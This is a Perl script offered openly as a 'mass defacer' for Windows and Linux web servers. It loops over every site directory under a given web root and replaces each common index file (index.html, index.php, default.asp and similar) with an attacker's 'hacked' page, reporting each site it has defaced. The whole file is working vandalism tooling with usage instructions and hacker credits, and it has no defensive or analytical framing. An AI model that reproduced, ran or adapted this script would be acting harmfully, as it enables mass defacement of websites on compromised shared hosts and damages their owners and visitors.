#!/usr/bin/perl

#My comments >>
#(C)oded by h4ckinger
#Web: www.hackinger.org
#Windows && Linux mass defacer script (c) h4ckinger
#usage: hmass.pl -i <ownedindex.html> -d <defacepath> -p <rootpath>
#example: hmass.pl -p public_html -i hacked.html -d c:\inetpub\wwwroot\
# [-p Optional ]
#mail: hackingerboy@gmail.com
#Special thanks: Darkc0de,CyberGhost,excellance,redLine
#plz send email when u discoverz a buggy
#end my comments<<

#my used functions
use Getopt::Std;
use FileHandle;
use File::Copy "cp";
#<<end used functions

#checking OS
my $OperatingSystem = $^O;
my $unix = "";
if (index(lc($OperatingSystem),"win")!=-1){
		   $unix="0"; #windows system
	    }else{
		    $unix="1"; #unix system
	    }

#Our variables
getopts (":p:i:d:", \%args);
$p=$args{p}; #root path
$d=$args{d};#mass deface path
$i=$args{i};#index file

#Our index files
#d0 u need 0ther add it
@indexz=('index.html','index.htm','index.asp','index.cfm','index.php','default.html','default.htm','default.asp','default.cfm','default.php');


#Parametres Checking
if(!defined($d) || !defined($i)){usage();}
if(defined($d) && defined($i) && !defined($p)){checkfile($i);checkdir($d);normaldeface($d);};
if(defined($d) && defined($i) && defined($p)){checkfile($i);checkdir($d);rootpathdeface($d,$p);};

#normal deface function
sub normaldeface{
if($unix){
system("clear");
}
else{system("cls");}
$dir=shift;
@otekidizinler=dizinbul($dir);
foreach $tekdizin(@otekidizinler){
foreach $tekindex(@indexz){
if($unix){
gopyala($i,"$dir//$tekdizin//$rpath//$tekindex");
}
else{gopyala($i,"$dir\\$tekdizin\\$rpath\\$tekindex");}
}
print "Defaced here : $tekdizin\n";
}
}

#rootpath deface function
sub rootpathdeface{
if($unix){
system("clear");
}
else{system("cls");}
($dzn,$rpath)=@_;
@aqdunyanin=dizinbul($dzn);
foreach $tekdizin(@aqdunyanin){
foreach $tekindex(@indexz){
if($unix){
gopyala($i,"$dzn//$tekdizin//$rpath//$tekindex");
}
else{gopyala($i,"$dzn\\$tekdizin\\$rpath\\$tekindex");}
}
print "Defaced here : $tekdizin\\$rpath\n";
}
}

#copy function
sub gopyala{
($file1,$file2)=@_;
$n = FileHandle->new("$file1","r");
cp($n,"$file2");
}

#list dir function
sub dizinbul {
   my ($dir) = @_;
   opendir(DIR, $dir) || return();
   my @files = readdir(DIR);
   closedir(DIR);
   @files = grep { -d "$dir/$_" } @files; #alt dizinler
   my @files = grep { $_ !~ /^(\.){1,2}$/ } @files;# Bir alt dizin ve içinde bulunulan dizini ayýkla
   return(@files);
}

sub checkfile{$file=shift; if(!-e $file){print "\n\"$file\" file doesn't exists,check your index file\n";exit;} }
sub checkdir{$dir=shift; if(!-d $dir){print "\n\"$dir\" path doesn't exists,check your deface path\n";exit;} }

#How i use this script ?
sub usage{

if($unix){
system("clear");
}
else{system("cls");}

print q
[
=========================================================================
h4ckinger Mass ExpLoit3r
(C)oded by h4ckinger
www.hackinger.org
usage: hmass.pl -i <ownedindex.html> -d <defacepath> -p <rootpath>
example: hmass.pl -p public_html -i hacked.html -d c:\inetpub\wwwroot\
-p Optional
=========================================================================
];
exit;
}